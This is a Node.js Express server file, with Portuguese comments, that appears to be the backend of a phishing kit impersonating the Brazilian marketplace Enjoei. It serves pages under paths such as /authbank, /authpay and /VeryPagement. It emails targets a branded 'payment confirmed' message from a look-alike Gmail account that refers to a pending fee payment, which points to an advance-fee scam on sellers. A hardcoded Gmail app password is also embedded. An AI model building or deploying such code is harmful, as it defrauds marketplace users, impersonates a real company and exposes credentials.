const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());

// Servir arquivos estáticos da pasta 'incial'
app.use(express.static(path.join(__dirname, 'incial')));
// Servir todas as pastas estáticas
app.use('/acess', express.static(path.join(__dirname, 'acess')));
app.use('/api', express.static(path.join(__dirname, 'api')));
app.use('/authbank', express.static(path.join(__dirname, 'authbank')));
app.use('/authpay', express.static(path.join(__dirname, 'authpay')));
app.use('/confirm', express.static(path.join(__dirname, 'confirm')));
app.use('/incial', express.static(path.join(__dirname, 'incial')));
app.use('/pay', express.static(path.join(__dirname, 'pay')));
app.use('/payvery', express.static(path.join(__dirname, 'payvery')));
app.use('/very', express.static(path.join(__dirname, 'very')));
app.use('/VeryPagement', express.static(path.join(__dirname, 'VeryPagement')));


// Rota principal
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'incial', 'index.html'));
});

// Transportador de e-mail (credenciais reais devem ser mantidas seguras!)
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'vendasenjoei427@gmail.com',
    pass: 'lrvd jewr hmae ceqi'
  }
});

// Rota para envio de e-mail
app.post('/enviar-email', (req, res) => {
  const { email } = req.body;

  const mailOptions = {
    from: 'Enjoei <vendasenjoei427@gmail.com>',
    to: email,
    subject: 'Pagamento confirmado! 💰',
    html: `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; line-height: 1.6; color: #333; background-color: #f9f9f9; border-radius: 10px;">
        <div style="text-align: center; padding: 20px; background-color: #800080; border-radius: 10px 10px 0 0;">
            <h1 style="color: #fff; margin: 0; font-size: 28px;">Parabéns pela sua venda! 🎉</h1>
        </div>
        <div style="padding: 20px; background-color: #fff; border-radius: 0 0 10px 10px;">
            <p style="font-size: 16px; margin: 0 0 15px;">Olá,</p>
            <p style="font-size: 16px; margin: 0 0 15px;">Temos uma ótima notícia! Todas as etapas para o recebimento do valor da sua venda foram concluídas com sucesso. 💰</p>
            <p style="font-size: 16px; margin: 0 0 15px;">No momento, estamos finalizando a análise dos detalhes do pagamento da taxa. <strong>Fique de olho!</strong> Em breve, você receberá uma confirmação por <strong>e-mail, SMS ou ligação</strong> avisando que o valor já está na sua conta.</p>
            <p style="font-size: 16px; margin: 0 0 15px;">Enquanto isso, prepare-se para ser redirecionado para uma rápida pesquisa de satisfação. Sua opinião é muito importante para nós! 😊</p>
            <div style="text-align: center; margin: 20px 0;">
                <a href="#" style="display: inline-block; padding: 10px 20px; background-color: #800080; color: #fff; text-decoration: none; border-radius: 5px; font-size: 16px;">Acompanhe seu pagamento</a>
            </div>
            <hr style="border: 0; border-top: 1px solid #eee; margin: 20px 0;" />
            <p style="font-size: 12px; color: #888; text-align: center;">Este é um e-mail automático, por favor, não responda diretamente. Se precisar de ajuda, entre em contato com nossa equipe em <a href="mailto:suporte@enjoei.com" style="color: #800080;">suporte@enjoei.com</a>.</p>
            <p style="font-size: 12px; color: #888; text-align: center;">Enjoei - Grito da moda! 💜</p>
        </div>
      </div>
    `
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error('Erro ao enviar e-mail:', error);
      res.status(500).send('Erro ao enviar o e-mail');
    } else {
      console.log('E-mail enviado:', info.response);
      res.send('E-mail enviado com sucesso!');
    }
  });
});

// Inicia o servidor
app.listen(PORT, () => {
  console.log(`Servidor rodando na porta ${PORT}`);
});
